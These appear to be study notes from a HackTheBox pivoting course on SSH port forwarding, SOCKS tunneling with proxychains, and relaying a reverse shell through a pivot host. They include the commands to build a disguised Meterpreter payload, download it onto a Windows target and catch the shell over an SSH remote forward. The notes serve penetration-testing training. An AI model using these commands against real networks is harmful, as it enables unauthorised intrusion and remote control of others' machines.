# Dynamic Port Forwarding with SSH and SOCKS Tunneling
## Port Forwarding in Context
- `Port forwarding` is a technique that allows us to redirect a communication request from one port to another.
- different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. 
	- This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.

## SSH Local Port Forwarding

![[SSH Local Port Forwarding.png]]
- We will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
```shell-session
AnuragTaparia@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
- The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234.

## Setting up to Pivot
- Now, if you type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:
	- One connected to our attack host (`ens192`)
	- One communicating to other hosts within a different network (`ens224`)
	- The loopback interface (`lo`).

![[Setting up to Pivot.png]]
- We can perform `dynamic port forwarding` and `pivot` our network packets via the Ubuntu server by starting a `SOCKS listener` on our `local host` (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host. 
- This is called `SSH tunneling` over `SOCKS proxy`. SOCKS stands for `Socket Secure`, a protocol that helps communicate with servers where you have firewall restrictions in place.
- In the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.
- One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from `NAT networks`.
#### Enabling Dynamic Port Forwarding with SSH

```shell-session
AnuragTaparia@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```
- The `-D` argument requests the SSH server to enable dynamic port forwarding.
-  Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together.
- To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.
- Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
#### Using Nmap with Proxychains

```shell-session
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -sn 172.16.5.0/24
```
- This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called `SOCKS tunneling`.
- One more **important note** to remember here is that we can only perform a `full TCP connect scan` over proxychains.
- We also need to make sure we are aware of the fact that `host-alive` checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.
#### Enumerating the Windows Target through Proxychains

```shell-session
proxychains nmap -v -Pn -sT 172.16.5.19
```

## Using Metasploit with Proxychains

```shell-session
proxychains msfconsole
```

#### Using xfreerdp with Proxychains

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```


# Remote/Reverse Port Forwarding with SSH

- As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.
 
![[Remote or Reverse Port Forwarding with SSH.png]]
- But what happens if we try to gain a reverse shell? 
	- The `outgoing connection` for the Windows host is only limited to the `172.16.5.0/23` network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).

- We have to find a pivot host, which is a common connection point between our attack host and the Windows server.  In our case, our pivot host would be the Ubuntu server since it can connect to both: `our attack host` and `the Windows target`.

- To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

```shell-session
AnuragTaparia@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

#### Configuring & Starting the multi/handler

```shell-session
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

- Once our payload is created and we have our listener configured & running, we can copy the - payload to the Ubuntu server using the `scp` command since we already have the credentials to connect to the Ubuntu server using SSH.
#### Transferring Payload to Pivot Host

```shell-session
AnuragTaparia@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

- After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.
#### Starting Python3 Webserver on Pivot Host

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload from Windows Target

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

- Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. 
- We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.
#### Using SSH -R

```shell-session
AnuragTaparia@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
- After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
- If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
- Our Meterpreter session should list that our incoming connection is from a local host itself (`127.0.0.1`) since we are receiving the connection over the `local SSH socket`, which created an `outbound` connection to the Ubuntu server. Issuing the `netstat` command can show us that the incoming connection is from the SSH service.

# Meterpreter Tunneling & Port Forwarding
